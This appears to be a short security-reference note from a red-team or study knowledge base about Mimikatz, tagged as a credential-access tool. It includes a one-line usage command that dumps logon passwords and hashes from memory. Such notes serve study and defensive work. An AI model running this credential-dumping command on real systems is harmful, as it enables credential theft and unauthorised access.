---
aliases:
  - Mimikatz
tags:
  - tool
  - credential_access
title: Mimikatz
id: TL0004
tactic: Credential Access
related_tactic: TA0006
---
## Note Links
[[PR0004 - Kerberos]]

## Synopsis
Mimikatz is a tool for extracting plaintexts, hashes, PIN codes, and Kerberos tickets from memory.

## Basic Usage
```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

## References
- https://github.com/gentilkiwi/mimikatz
